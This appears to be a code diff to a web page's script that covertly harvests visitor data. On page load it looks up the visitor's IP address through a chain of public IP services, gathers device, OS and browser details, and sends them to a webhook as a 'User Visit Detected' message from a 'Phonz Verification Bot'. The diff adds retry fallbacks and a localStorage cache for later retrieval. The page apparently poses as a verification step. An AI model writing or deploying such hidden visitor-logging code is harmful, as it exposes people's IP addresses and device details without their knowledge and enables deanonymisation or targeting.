@@ -658,23 +658,54 @@ window.addEventListener('load', function() {
     }, 100); // Small delay to ensure loading sequence starts first
 });
 
+// Get IP address with multiple fallback services
+async function getIPAddress() {
+    const ipServices = [
+        { url: 'https://api.ipify.org?format=json', parser: (data) => data.ip },
+        { url: 'https://ipapi.co/json/', parser: (data) => data.ip },
+        { url: 'https://api.myip.com', parser: (data) => data.ip },
+        { url: 'https://httpbin.org/ip', parser: (data) => data.origin },
+        { url: 'https://ifconfig.me/ip', parser: (data) => data.trim() }
+    ];
+    
+    for (const service of ipServices) {
+        try {
+            console.log(`🔄 Trying IP service: ${service.url}`);
+            const response = await fetch(service.url, {
+                method: 'GET',
+                mode: 'cors',
+                cache: 'no-cache',
+                headers: {
+                    'Accept': 'application/json'
+                }
+            });
+            
+            if (response.ok) {
+                const data = await response.json();
+                const ip = service.parser(data);
+                
+                if (ip && ip !== 'Unknown IP') {
+                    console.log(`✅ IP retrieved from ${service.url}: ${ip}`);
+                    return ip;
+                }
+            }
+        } catch (error) {
+            console.log(`❌ IP service ${service.url} failed:`, error.message);
+        }
+    }
+    
+    console.log('⚠️ All IP services failed, using fallback');
+    return 'Unknown IP';
+}
+
 // Collect IP and send initial webhook with just IP and device info
 async function collectIPAndSendInitialWebhook() {
     console.log('🌐 Starting IP collection and initial webhook...');
     
     try {
-        // Get IP address
+        // Get IP address with multiple fallback services
         console.log('📡 Getting IP address...');
-        userIP = await fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                console.log('✅ IP retrieved:', data.ip);
-                return data.ip;
-            })
-            .catch(error => {
-                console.error('❌ Failed to get IP:', error);
-                return 'Unknown IP';
-            });
+        userIP = await getIPAddress();
         
         // Get device info
         console.log('📱 Getting device info...');
@@ -682,6 +713,8 @@ async function collectIPAndSendInitialWebhook() {
         
         // Send initial webhook with just IP and device info
         console.log('📤 Sending initial webhook with IP and device info...');
+        console.log('📋 IP Address:', userIP);
+        
         const initialSuccess = await sendInitialWebhook(userIP, deviceInfo);
         
         if (initialSuccess) {
@@ -689,6 +722,13 @@ async function collectIPAndSendInitialWebhook() {
             console.log('✅ Initial webhook sent successfully');
         } else {
             console.error('❌ Failed to send initial webhook');
+            // Try simple fallback method
+            console.log('🔄 Trying simple fallback webhook method...');
+            const fallbackSuccess = await sendSimpleWebhook(userIP, deviceInfo);
+            if (fallbackSuccess) {
+                initialWebhookSent = true;
+                console.log('✅ Fallback webhook sent successfully');
+            }
         }
         
     } catch (error) {
@@ -740,6 +780,66 @@ async function sendInitialWebhook(ip, deviceInfo) {
         
     } catch (error) {
         console.error('❌ Error sending initial webhook:', error);
+        return false;
+    }
+}
+
+// Simple webhook fallback method using Image beacon
+async function sendSimpleWebhook(ip, deviceInfo) {
+    if (!WEBHOOK_URL) {
+        console.error('❌ Webhook URL is not configured');
+        return false;
+    }
+    
+    try {
+        // Create a simple message payload
+        const message = `🌐 User Visit Detected\n🆔 Session: ${sessionId}\n🌐 IP: ${ip}\n📱 Device: ${deviceInfo.platform}\n🖥️ OS: ${deviceInfo.os}\n🌍 Browser: ${deviceInfo.browser}`;
+        
+        // Try using a simple POST request without complex headers
+        const payload = {
+            content: message,
+            username: 'Phonz Verification Bot'
+        };
+        
+        console.log('📦 Simple webhook payload prepared');
+        
+        // Try direct fetch with minimal headers
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            if (response.ok) {
+                console.log('✅ Simple webhook succeeded!');
+                return true;
+            }
+        } catch (error) {
+            console.log('❌ Simple webhook failed:', error.message);
+        }
+        
+        // Fallback: Store in localStorage for manual retrieval
+        const storedData = {
+            message: message,
+            timestamp: new Date().toISOString(),
+            webhookUrl: WEBHOOK_URL,
+            sessionData: {
+                sessionId: sessionId,
+                ip: ip,
+                deviceInfo: deviceInfo
+            }
+        };
+        
+        localStorage.setItem('failedWebhook_' + Date.now(), JSON.stringify(storedData));
+        console.log('💾 Webhook data stored in localStorage for manual retrieval');
+        
+        return false;
+        
+    } catch (error) {
+        console.error('❌ Error in simple webhook:', error);
         return false;
     }
 }
